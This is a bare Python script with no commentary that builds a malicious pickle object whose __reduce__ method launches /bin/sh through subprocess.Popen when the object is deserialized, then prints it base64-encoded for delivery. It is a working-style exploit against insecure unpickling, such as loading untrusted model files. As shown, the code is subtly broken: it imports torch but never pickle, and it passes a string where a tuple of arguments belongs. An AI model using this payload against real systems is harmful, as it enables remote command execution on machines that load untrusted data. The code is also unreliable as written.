import subprocess
import base64
import torch

class Payload(object):
    def __reduce__(self):
        return (subprocess.Popen, (('/bin/sh'),))

print(base64.b64encode(pickle.dumps(Payload())))

